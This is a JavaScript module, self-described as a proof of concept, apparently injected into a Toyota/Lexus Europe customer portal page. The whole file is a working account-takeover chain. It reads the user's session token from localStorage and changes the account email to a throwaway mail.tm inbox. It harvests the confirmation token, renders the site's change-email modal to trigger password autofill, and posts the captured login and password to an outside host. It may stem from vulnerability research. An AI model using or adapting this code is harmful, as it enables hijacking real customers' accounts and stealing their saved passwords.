define([], function () {
  var HTTPBIN_BASE = "https://httpbin.org/anything/cp-hash-loader";
  var USER_TOKEN_KEY = "com.toyota.tme.user.token";
  var USER_PROFILE_KEY = "com.toyota.tme.user.customerProfile";

  var TEMP_MAIL_BASE = "https://api.mail.tm";
  var TEMP_MAIL_TIMEOUT_MS = 120000;
  var TEMP_MAIL_POLL_MS = 3500;
  var AUTOFILL_WAIT_MS = 25000;
  var LATE_PASSWORD_WAIT_MS = 120000;
  var SSO_RENDER_WAIT_MS = 20000;

  var STATE_KEY = "cp_tempmail_ato_state";
  var SSO_FALLBACK_BASE = "https://ssomsa.toyota-europe.com";

  function nowIso() {
    return new Date().toISOString();
  }

  function sleep(ms) {
    return new Promise(function (resolve) {
      setTimeout(resolve, ms);
    });
  }

  function normalizeString(v) {
    return (v == null ? "" : String(v)).trim();
  }

  function stripProtocol(urlLike) {
    return (urlLike || "")
      .replace(/^https?:\/\//i, "")
      .replace(/^\/+/, "")
      .replace(/\/+$/, "");
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function safeJsonParse(text, fallback) {
    if (!text || typeof text !== "string") {
      return fallback;
    }
    return safeCall(function () {
      return JSON.parse(text);
    }, fallback);
  }

  function upsertSpeechBalloon(title, statusText, isError) {
    var balloonId = "cp-tempmail-balloon";
    var titleId = "cp-tempmail-balloon-title";
    var statusId = "cp-tempmail-balloon-status";
    var balloon = document.getElementById(balloonId);

    if (!balloon) {
      balloon = document.createElement("div");
      balloon.id = balloonId;
      balloon.style.position = "fixed";
      balloon.style.right = "22px";
      balloon.style.bottom = "24px";
      balloon.style.maxWidth = "520px";
      balloon.style.padding = "12px 14px";
      balloon.style.background = "#0b1022";
      balloon.style.color = "#e6ecff";
      balloon.style.border = "1px solid #5aa0ff";
      balloon.style.borderRadius = "12px";
      balloon.style.boxShadow = "0 10px 28px rgba(0, 0, 0, 0.45)";
      balloon.style.font = "12px/1.45 monospace";
      balloon.style.zIndex = "2147483647";

      var titleEl = document.createElement("div");
      titleEl.id = titleId;
      titleEl.style.fontWeight = "700";
      titleEl.style.marginBottom = "5px";
      balloon.appendChild(titleEl);

      var statusEl = document.createElement("div");
      statusEl.id = statusId;
      statusEl.style.whiteSpace = "pre-wrap";
      balloon.appendChild(statusEl);

      document.documentElement.appendChild(balloon);
    }

    var titleNode = document.getElementById(titleId);
    var statusNode = document.getElementById(statusId);

    if (titleNode) {
      titleNode.textContent = title || "PoC";
    }
    if (statusNode) {
      statusNode.textContent = statusText || "";
      statusNode.style.color = isError ? "#ffafaf" : "#7cffb4";
    }
    if (balloon) {
      balloon.style.borderColor = isError ? "#ff8080" : "#5aa0ff";
    }
  }

  function requestJson(url, options) {
    return fetch(url, options).then(function (response) {
      return response.text().then(function (text) {
        return {
          ok: response.ok,
          status: response.status,
          url: url,
          text: text || "",
          textPreview: (text || "").slice(0, 320),
          json: safeJsonParse(text, null)
        };
      });
    });
  }

  function parseListResponse(json) {
    if (!json) {
      return [];
    }
    if (Array.isArray(json)) {
      return json;
    }
    if (Array.isArray(json["hydra:member"])) {
      return json["hydra:member"];
    }
    if (Array.isArray(json.messages)) {
      return json.messages;
    }
    return [];
  }

  function getStoredUserProfile() {
    var raw = safeCall(function () {
      return localStorage.getItem(USER_PROFILE_KEY) || "";
    }, "");
    return safeJsonParse(raw, {}) || {};
  }

  function inferBrand() {
    var t1Brand = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.brand;
    }, "");
    if (t1Brand) {
      return String(t1Brand).toUpperCase();
    }
    return window.location.host && window.location.host.toLowerCase().indexOf("lexus") !== -1 ? "LEXUS" : "TOYOTA";
  }

  function inferLocale(profile) {
    var fromProfile = normalizeString(profile.languageCode) + "-" + normalizeString(profile.countryCode);
    var t1Locale = safeCall(function () {
      var t1 = window.T1 && window.T1.settings ? window.T1.settings : {};
      return normalizeString(t1.language) + "-" + normalizeString(t1.country);
    }, "");
    var raw = normalizeString(fromProfile) !== "-" ? fromProfile : t1Locale;
    raw = normalizeString(raw).toLowerCase();
    return raw && raw !== "-" ? raw : "en-gb";
  }

  function getCpAggregatorBase() {
    var cpHost = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.cpB2cAggrHost;
    }, "");
    var host = stripProtocol(cpHost || "cpb2cs.toyota-europe.com");
    return "https://" + host + "/api";
  }

  function getSsoServiceBase() {
    var raw = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.ssoServiceUrl;
    }, "");
    var v = normalizeString(raw || SSO_FALLBACK_BASE);
    if (!v) {
      return SSO_FALLBACK_BASE;
    }
    if (/^https?:\/\//i.test(v)) {
      return v.replace(/\/+$/, "");
    }
    return "https://" + stripProtocol(v);
  }

  function getAuthContext() {
    var token = safeCall(function () {
      return localStorage.getItem(USER_TOKEN_KEY) || "";
    }, "");
    var profile = getStoredUserProfile();

    var oldEmail = normalizeString(profile.email || profile.userEmail || profile.username);
    var originalUsername = normalizeString(profile.username || profile.userName || oldEmail);
    var firstName = normalizeString(profile.firstName || profile.givenName || "");
    var uuid = normalizeString(profile.uuid || (profile.customerProfile && profile.customerProfile.uuid));

    return {
      token: token,
      uuid: uuid,
      oldEmail: oldEmail,
      originalUsername: originalUsername,
      firstName: firstName,
      brand: inferBrand(),
      locale: inferLocale(profile),
      aggregatorBase: getCpAggregatorBase(),
      ssoBase: getSsoServiceBase()
    };
  }

  function buildActionHeaders(ctx, tokenOverride) {
    return {
      "Content-Type": "application/json;charset=UTF-8",
      "X-TME-TOKEN": normalizeString(tokenOverride || ctx.token),
      "X-TME-BRAND": ctx.brand,
      "X-TME-LC": ctx.locale
    };
  }

  function buildSsoHeaders(ctx) {
    return {
      "Content-Type": "application/json;charset=UTF-8",
      Accept: "application/json",
      "X-TME-BRAND": ctx.brand,
      "X-TME-LC": ctx.locale
    };
  }

  function extractUrls(text) {
    var input = normalizeString(text);
    if (!input) {
      return [];
    }
    var re = /https?:\/\/[^\s"'<>]+/g;
    var out = [];
    var m;
    while ((m = re.exec(input)) !== null) {
      out.push(m[0]);
    }
    return out;
  }

  function tryDecodeURIComponent(value) {
    var input = normalizeString(value);
    if (!input) {
      return "";
    }
    return safeCall(function () {
      return decodeURIComponent(input);
    }, input);
  }

  function sanitizeExtractedToken(token) {
    return normalizeString(token).replace(/["'<>)\]}.,;:]+$/g, "");
  }

  function extractEmailTokenFromUrl(urlLike) {
    var raw = normalizeString(urlLike).replace(/&amp;/gi, "&");
    if (!raw) {
      return "";
    }

    var queue = [raw];
    var seen = {};

    while (queue.length) {
      var candidate = normalizeString(queue.shift());
      if (!candidate || seen[candidate]) {
        continue;
      }
      seen[candidate] = true;

      var direct = candidate.match(/(?:[?&#]|^)emailToken=([^&#\s]+)/i);
      if (direct && direct[1]) {
        return sanitizeExtractedToken(tryDecodeURIComponent(direct[1]));
      }

      var encoded = candidate.match(/emailToken%3D([^&#\s]+)/i);
      if (encoded && encoded[1]) {
        return sanitizeExtractedToken(tryDecodeURIComponent(encoded[1]));
      }

      if (/^https?:\/\//i.test(candidate)) {
        var parsed = safeCall(function () {
          return new URL(candidate);
        }, null);
        if (parsed && parsed.searchParams) {
          var entries = safeCall(function () {
            return Array.from(parsed.searchParams.entries());
          }, []);
          for (var i = 0; i < entries.length; i++) {
            var key = normalizeString(entries[i][0]).toLowerCase();
            var value = normalizeString(entries[i][1]);
            if (!value) {
              continue;
            }
            if (key === "emailtoken") {
              return sanitizeExtractedToken(tryDecodeURIComponent(value));
            }
            if (/emailtoken/i.test(value) || /^https?:\/\//i.test(value) || /%2f%2f/i.test(value)) {
              queue.push(tryDecodeURIComponent(value));
            }
          }
        }
      }

      var decoded = tryDecodeURIComponent(candidate);
      if (decoded && decoded !== candidate) {
        queue.push(decoded);
      }
    }

    return "";
  }

  function extractConfirmClickUrl(messageBody) {
    var body = normalizeString(messageBody);
    if (!body) {
      return "";
    }

    var directTokenUrl = "";
    var urls = extractUrls(body);
    for (var i = 0; i < urls.length; i++) {
      if (extractEmailTokenFromUrl(urls[i])) {
        directTokenUrl = urls[i];
        break;
      }
    }
    if (directTokenUrl) {
      return directTokenUrl;
    }

    var idx = body.indexOf("Vahvista");
    if (idx < 0) {
      idx = body.indexOf("Confirm");
    }
    if (idx >= 0) {
      var around = body.slice(Math.max(0, idx - 1800), Math.min(body.length, idx + 2600));
      var hrefs = [];
      var hrefRe = /href="([^"]+)"/gi;
      var hm;
      while ((hm = hrefRe.exec(around)) !== null) {
        hrefs.push(hm[1]);
      }
      for (var j = 0; j < hrefs.length; j++) {
        if (hrefs[j].indexOf("click.crm.lexus-europe.com") !== -1) {
          return hrefs[j];
        }
      }
    }

    for (var k = 0; k < urls.length; k++) {
      var u = urls[k];
      if (u.indexOf("click.crm.lexus-europe.com") === -1) {
        continue;
      }
      if (u.indexOf("open.aspx") !== -1 || u.indexOf("newpoweredby") !== -1 || u.indexOf("view our policy") !== -1) {
        continue;
      }
      return u;
    }

    return "";
  }

  function saveState(state) {
    safeCall(function () {
      localStorage.setItem(STATE_KEY, JSON.stringify(state || {}));
    }, null);
  }

  function loadState() {
    return safeCall(function () {
      return safeJsonParse(localStorage.getItem(STATE_KEY) || "", {}) || {};
    }, {});
  }

  function clearState() {
    safeCall(function () {
      localStorage.removeItem(STATE_KEY);
    }, null);
  }

  async function createTempMailbox() {
    var domainsResp = await requestJson(TEMP_MAIL_BASE + "/domains?page=1", {
      method: "GET",
      mode: "cors",
      credentials: "omit",
      headers: { Accept: "application/json" }
    });
    var domains = parseListResponse(domainsResp.json);
    if (!domains || !domains.length) {
      throw new Error("tempmail_domains_unavailable");
    }
    var domain = normalizeString(domains[0].domain || domains[0].name);
    if (!domain) {
      throw new Error("tempmail_domain_missing");
    }

    var attempt = 0;
    while (attempt < 5) {
      attempt += 1;
      var localPart = "cpato" + Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
      var address = localPart + "@" + domain;
      var password = "Tmp." + Math.random().toString(36).slice(2, 12) + "!";

      var createResp = await requestJson(TEMP_MAIL_BASE + "/accounts", {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ address: address, password: password })
      });

      if (!(createResp.ok || createResp.status === 201)) {
        continue;
      }

      var tokenResp = await requestJson(TEMP_MAIL_BASE + "/token", {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ address: address, password: password })
      });

      var mailboxToken = normalizeString(tokenResp.json && tokenResp.json.token);
      if (!tokenResp.ok || !mailboxToken) {
        continue;
      }

      return {
        address: address,
        password: password,
        token: mailboxToken
      };
    }

    throw new Error("tempmail_account_create_failed");
  }

  async function pollConfirmationClickUrl(tempMailbox) {
    var started = Date.now();
    while (Date.now() - started < TEMP_MAIL_TIMEOUT_MS) {
      var listResp = await requestJson(TEMP_MAIL_BASE + "/messages?page=1", {
        method: "GET",
        mode: "cors",
        credentials: "omit",
        headers: {
          Accept: "application/json",
          Authorization: "Bearer " + tempMailbox.token
        }
      });

      var messages = parseListResponse(listResp.json);
      if (messages && messages.length) {
        for (var i = 0; i < messages.length; i++) {
          var id = normalizeString(messages[i].id);
          if (!id) {
            continue;
          }
          var msgResp = await requestJson(TEMP_MAIL_BASE + "/messages/" + encodeURIComponent(id), {
            method: "GET",
            mode: "cors",
            credentials: "omit",
            headers: {
              Accept: "application/json",
              Authorization: "Bearer " + tempMailbox.token
            }
          });
          var msg = msgResp.json || {};
          var html = "";
          if (Array.isArray(msg.html)) {
            html = msg.html.join("\n");
          } else {
            html = normalizeString(msg.html);
          }
          var text = "";
          if (Array.isArray(msg.text)) {
            text = msg.text.join("\n");
          } else {
            text = normalizeString(msg.text || msg.intro || "");
          }

          var clickUrl = extractConfirmClickUrl(html + "\n" + text);
          if (clickUrl) {
            return {
              messageId: id,
              clickUrl: clickUrl
            };
          }
        }
      }

      await sleep(TEMP_MAIL_POLL_MS);
    }

    throw new Error("tempmail_confirmation_mail_timeout");
  }

  async function performEmailChange(ctx, targetEmail) {
    var url = ctx.aggregatorBase + "/users/" + encodeURIComponent(ctx.uuid) + "/email/change";
    var body = {
      oldEmail: ctx.oldEmail,
      newEmail: targetEmail,
      originalUsername: ctx.originalUsername || ctx.oldEmail,
      firstName: ctx.firstName || "Poc"
    };

    return requestJson(url, {
      method: "PUT",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: buildActionHeaders(ctx),
      body: JSON.stringify(body)
    });
  }

  function findPasswordInput() {
    var preferred = document.querySelector("input[data-test-id='-change-email-password-input']");
    if (preferred) {
      return preferred;
    }
    return document.querySelector("input[type='password']");
  }

  function pokeAutofillOnInput(node) {
    if (!node) {
      return;
    }
    safeCall(function () {
      var doc = node.ownerDocument || document;
      var frameWindow = doc.defaultView || window;
      node.autocomplete = "current-password";
      if (frameWindow && frameWindow.focus) {
        frameWindow.focus();
      }
      node.focus();
      node.click();
      node.dispatchEvent(new frameWindow.KeyboardEvent("keydown", { bubbles: true, key: "ArrowDown", code: "ArrowDown" }));
    }, null);
  }

  function getScriptSrcMatching(pattern) {
    var scripts = safeCall(function () {
      return Array.prototype.slice.call(document.getElementsByTagName("script"));
    }, []);
    for (var i = 0; i < scripts.length; i++) {
      var src = normalizeString(scripts[i].src || "");
      if (src && pattern.test(src)) {
        return src;
      }
    }
    return "";
  }

  function getSsoConfigurationUrl() {
    var fromScript = getScriptSrcMatching(/\/cp-ui-sso\/configuration\.js(?:[?#].*)?$/i);
    if (fromScript) {
      return fromScript;
    }

    var redesignBase = normalizeString(
      safeCall(function () {
        return window.T1 && window.T1.settings && window.T1.settings.ssoRedesignBaseUrl;
      }, "")
    );
    if (redesignBase) {
      return redesignBase.replace(/\/+$/, "") + "/configuration.js";
    }

    var cpCommonUrl = normalizeString(
      safeCall(function () {
        return window.T1 && window.T1.settings && window.T1.settings.cpCommonUrl;
      }, "")
    );
    if (cpCommonUrl) {
      return cpCommonUrl.replace(/\/+$/, "") + "/cp-ui-sso/configuration.js";
    }

    return "https://cp-common.toyota-europe.com/cp-ui-sso/configuration.js";
  }

  function getRequireFunction() {
    var candidates = [
      safeCall(function () { return window.requirejs; }, null),
      safeCall(function () { return window.require; }, null)
    ];
    for (var i = 0; i < candidates.length; i++) {
      if (typeof candidates[i] === "function") {
        return candidates[i];
      }
    }
    return null;
  }

  function findLoadedSsoConfigurationModule(requireFn) {
    var defined = safeCall(function () {
      return requireFn && requireFn.s && requireFn.s.contexts && requireFn.s.contexts._ && requireFn.s.contexts._.defined;
    }, null);
    if (!defined || typeof defined !== "object") {
      return null;
    }

    var keys = Object.keys(defined);
    for (var i = 0; i < keys.length; i++) {
      var key = keys[i];
      var candidate = defined[key];
      if (candidate && typeof candidate.render === "function" && /cp-ui-sso\/configuration\.js/i.test(key)) {
        return candidate;
      }
    }

    for (var j = 0; j < keys.length; j++) {
      var key2 = keys[j];
      var candidate2 = defined[key2];
      if (candidate2 && typeof candidate2.render === "function" && candidate2.contract && candidate2.version) {
        return candidate2;
      }
    }

    return null;
  }

  function loadSsoConfigurationModule(configUrl) {
    return new Promise(function (resolve, reject) {
      var requireFn = getRequireFunction();
      if (!requireFn) {
        reject(new Error("requirejs_not_available"));
        return;
      }

      var alreadyLoaded = findLoadedSsoConfigurationModule(requireFn);
      if (alreadyLoaded) {
        resolve(alreadyLoaded);
        return;
      }

      var settled = false;
      var timer = setTimeout(function () {
        if (settled) {
          return;
        }
        settled = true;
        reject(new Error("sso_configuration_load_timeout"));
      }, SSO_RENDER_WAIT_MS);

      function done(err, moduleInstance) {
        if (settled) {
          return;
        }
        settled = true;
        clearTimeout(timer);
        if (err) {
          reject(err);
          return;
        }
        resolve(moduleInstance);
      }

      try {
        requireFn(
          [configUrl],
          function (moduleFromRequire) {
            var moduleInstance = moduleFromRequire || findLoadedSsoConfigurationModule(requireFn);
            if (!moduleInstance || typeof moduleInstance.render !== "function") {
              done(new Error("sso_configuration_module_missing_render"));
              return;
            }
            done(null, moduleInstance);
          },
          function (requireErr) {
            done(requireErr || new Error("sso_configuration_require_failed"));
          }
        );
      } catch (e) {
        done(e);
      }
    });
  }

  function ensureSsoWrapperContainer() {
    var root = document.getElementById("sso-wrapper");
    if (root) {
      return root;
    }

    var host = document.getElementById("ssoMaterialBoxContainer");
    if (!host) {
      host = document.createElement("div");
      host.id = "ssoMaterialBoxContainer";
      host.className = "material-box sso-material-box";
      host.style.position = "fixed";
      host.style.inset = "0";
      host.style.zIndex = "2147483640";
      host.style.background = "rgba(0, 0, 0, 0.55)";
      host.style.overflowY = "auto";
      host.style.padding = "24px 10px";

      var content = document.createElement("div");
      content.className = "material-box-content";
      content.style.maxWidth = "760px";
      content.style.margin = "0 auto";
      content.style.minHeight = "100%";
      content.style.display = "flex";
      content.style.alignItems = "center";
      content.style.justifyContent = "center";

      root = document.createElement("div");
      root.id = "sso-wrapper";
      root.style.width = "100%";
      root.style.maxWidth = "720px";
      root.style.background = "#fff";
      root.style.borderRadius = "10px";
      root.style.padding = "0";
      root.style.boxShadow = "0 20px 60px rgba(0, 0, 0, 0.4)";

      content.appendChild(root);
      host.appendChild(content);
      (document.body || document.documentElement).appendChild(host);
      return root;
    }

    root = document.createElement("div");
    root.id = "sso-wrapper";
    host.appendChild(root);
    return root;
  }

  async function waitForPasswordInputPresence(timeoutMs) {
    var started = Date.now();
    while (Date.now() - started < timeoutMs) {
      var node = findPasswordInput();
      if (node) {
        pokeAutofillOnInput(node);
        return true;
      }
      await sleep(250);
    }
    return false;
  }

  async function openChangeEmailModalInPage(emailToken) {
    var normalizedToken = normalizeString(emailToken);
    if (!normalizedToken) {
      throw new Error("missing_email_token_for_inpage_render");
    }

    ensureSsoWrapperContainer();
    var configUrl = getSsoConfigurationUrl();
    var ssoConfig = await loadSsoConfigurationModule(configUrl);

    if (!ssoConfig || typeof ssoConfig.render !== "function") {
      throw new Error("sso_config_render_not_available");
    }

    ssoConfig.render(
      {
        contractKey: "changeEmail",
        emailToken: normalizedToken
      },
      {
        topic: "sso.email.change.requested"
      }
    );

    var rendered = await waitForPasswordInputPresence(SSO_RENDER_WAIT_MS);
    return {
      ok: rendered,
      source: rendered ? "inpage_modal_rendered" : "inpage_modal_input_not_found",
      configUrl: configUrl
    };
  }

  async function waitForAutofilledPassword(timeoutMs) {
    var started = Date.now();
    while (Date.now() - started < timeoutMs) {
      var node = findPasswordInput();
      if (node) {
        var val = normalizeString(node.value);
        if (val) {
          return { ok: true, password: val, source: "autofill_present" };
        }

        pokeAutofillOnInput(node);
      }

      await sleep(700);
    }

    return { ok: false, password: "", source: "autofill_unavailable" };
  }

  async function writeCredentialsToHttpbin(loginEmail, password) {
    return requestJson(HTTPBIN_BASE + "/tempmail-autofill-credentials", {
      method: "POST",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        loginEmail: normalizeString(loginEmail),
        password: normalizeString(password)
      })
    });
  }

  async function phaseAuthenticatedRequestAndTokenHarvest(ctx) {
    if (!ctx || !ctx.token || !ctx.uuid || !ctx.oldEmail) {
      throw new Error("missing_authenticated_context");
    }

    upsertSpeechBalloon("Temp mailbox", "Creating disposable mailbox...", false);
    var mailbox = await createTempMailbox();

    upsertSpeechBalloon("Email change request", "Requesting email change to: " + mailbox.address, false);
    var change = await performEmailChange(ctx, mailbox.address);
    if (!change.ok) {
      throw new Error("email_change_failed_status_" + change.status);
    }

    upsertSpeechBalloon("Mailbox poll", "Waiting confirmation email in temp inbox...", false);
    var mailHit = await pollConfirmationClickUrl(mailbox);
    var emailToken = extractEmailTokenFromUrl(mailHit.clickUrl);
    if (!emailToken) {
      throw new Error("confirmation_email_token_missing");
    }

    var state = {
      phase: "pending_inpage_modal_password_capture",
      createdAt: nowIso(),
      tempEmail: mailbox.address,
      tempMailboxPassword: mailbox.password,
      mailboxTokenPrefix: mailbox.token.slice(0, 10),
      clickUrl: mailHit.clickUrl,
      emailToken: emailToken,
      emailChangeStatus: change.status
    };
    saveState(state);

    upsertSpeechBalloon("In-page modal", "Rendering SSO change-email modal in current page using extracted emailToken...", false);
    var modalOpen = await openChangeEmailModalInPage(emailToken);
    if (!modalOpen.ok) {
      throw new Error("inpage_change_email_modal_not_rendered");
    }

    upsertSpeechBalloon("Autofill capture", "Waiting browser autofill on in-page change-email password field...", false);
    var pw = await waitForAutofilledPassword(AUTOFILL_WAIT_MS);
    if (!pw.ok || !pw.password) {
      upsertSpeechBalloon(
        "Autofill unavailable",
        "No auto-filled password detected yet in in-page SSO modal flow.\n" +
          "Waiting extra time for late autofill/manual manager selection...",
        true
      );
      pw = await waitForAutofilledPassword(LATE_PASSWORD_WAIT_MS);
    }

    if (!pw.ok || !pw.password) {
      saveState({
        phase: "pending_inpage_modal_password_capture",
        createdAt: state.createdAt || nowIso(),
        tempEmail: state.tempEmail || "",
        clickUrl: mailHit.clickUrl,
        emailToken: emailToken,
        emailChangeStatus: state.emailChangeStatus || 0,
        lastError: "inpage_modal_autofill_password_not_available"
      });

      upsertSpeechBalloon(
        "Autofill still unavailable",
        "Chain is staged and waiting only for password autofill in in-page modal flow.\n" +
          "emailToken=\n" + emailToken,
        true
      );
      window.__CP_TEMPMAIL_ATO_PENDING__ = {
        reason: "inpage_modal_autofill_password_not_available",
        clickUrl: mailHit.clickUrl,
        emailToken: emailToken,
        tempEmail: state.tempEmail || ""
      };
      return;
    }

    var loginEmail = normalizeString(ctx.oldEmail || ctx.originalUsername);
    if (!loginEmail) {
      throw new Error("login_email_missing");
    }

    upsertSpeechBalloon("Credential capture", "Autofill captured in in-page modal flow. Sending login/email + password to httpbin...", false);
    var httpbin = await writeCredentialsToHttpbin(loginEmail, pw.password);
    clearState();

    upsertSpeechBalloon(
      "Capture complete",
      "login_email=" + loginEmail + "\npassword=" + pw.password +
        "\nrender_source=" + modalOpen.source +
        "\nsso_config=" + modalOpen.configUrl +
        "\nhttpbin_status=" + httpbin.status +
        "\nhttpbin=" + httpbin.url,
      false
    );

    window.__CP_TEMPMAIL_ATO_RESULT__ = {
      loginEmail: loginEmail,
      password: pw.password,
      renderSource: modalOpen.source,
      ssoConfigUrl: modalOpen.configUrl,
      httpbinStatus: httpbin.status,
      httpbinUrl: httpbin.url
    };
  }

  async function phaseConfirmAndRotate(ctx, tokenFromUrl) {
    var state = loadState();
    var emailToken = normalizeString(tokenFromUrl || state.emailToken);
    if (!emailToken) {
      throw new Error("missing_email_token_phase2");
    }

    upsertSpeechBalloon("In-page modal", "Rendering SSO change-email modal in current page using emailToken...", false);
    var modalOpen = await openChangeEmailModalInPage(emailToken);
    if (!modalOpen.ok) {
      throw new Error("inpage_change_email_modal_not_rendered_phase2");
    }

    upsertSpeechBalloon("Autofill capture", "Waiting browser autofill on in-page confirmation password field...", false);
    var pw = await waitForAutofilledPassword(AUTOFILL_WAIT_MS);
    if (!pw.ok || !pw.password) {
      upsertSpeechBalloon(
        "Autofill unavailable",
        "No password was auto-filled in this browser profile (in-page modal flow).\n" +
          "Waiting extra time for late autofill/manual manager selection...",
        true
      );
      pw = await waitForAutofilledPassword(LATE_PASSWORD_WAIT_MS);
    }

    if (!pw.ok || !pw.password) {
      saveState({
        phase: "pending_inpage_modal_password_capture",
        createdAt: state.createdAt || nowIso(),
        tempEmail: state.tempEmail || "",
        emailToken: emailToken,
        injectedConfirmUrl: state.injectedConfirmUrl || window.location.href,
        emailChangeStatus: state.emailChangeStatus || 0,
        lastError: "inpage_modal_autofill_password_not_available"
      });

      var resume = window.location.href;
      upsertSpeechBalloon(
        "Autofill still unavailable",
        "Chain is staged and waiting only for browser credential autofill in in-page modal flow.\nResume URL:\n" + resume,
        true
      );
      window.__CP_TEMPMAIL_ATO_PENDING__ = {
        reason: "inpage_modal_autofill_password_not_available",
        resumeUrl: resume,
        emailToken: emailToken,
        tempEmail: state.tempEmail || ""
      };
      return;
    }

    var loginEmail = normalizeString(ctx.oldEmail || ctx.originalUsername);
    if (!loginEmail) {
      throw new Error("login_email_missing");
    }

    upsertSpeechBalloon("Credential capture", "Autofill captured. Sending login/email + password to httpbin...", false);
    var httpbin = await writeCredentialsToHttpbin(loginEmail, pw.password);
    clearState();

    upsertSpeechBalloon(
      "Capture complete",
      "login_email=" + loginEmail + "\npassword=" + pw.password +
        "\nrender_source=" + modalOpen.source +
        "\nsso_config=" + modalOpen.configUrl +
        "\nhttpbin_status=" + httpbin.status +
        "\nhttpbin=" + httpbin.url,
      false
    );

    window.__CP_TEMPMAIL_ATO_RESULT__ = {
      loginEmail: loginEmail,
      password: pw.password,
      renderSource: modalOpen.source,
      ssoConfigUrl: modalOpen.configUrl,
      httpbinStatus: httpbin.status,
      httpbinUrl: httpbin.url
    };
  }

  async function executePoC() {
    var ctx = getAuthContext();
    var currentToken = extractEmailTokenFromUrl(window.location.href || "");

    if (currentToken) {
      return phaseConfirmAndRotate(ctx, currentToken);
    }

    return phaseAuthenticatedRequestAndTokenHarvest(ctx);
  }

  executePoC().catch(function (err) {
    var msg = String(err && err.message ? err.message : err);
    upsertSpeechBalloon("PoC error", msg, true);
    window.__CP_TEMPMAIL_ATO_ERROR__ = msg;
  });

  return {
    version: "1.4.0-tempmail-inpage-sso-token-modal-autofill-capture",
    render: function () {
      return executePoC();
    }
  };
});
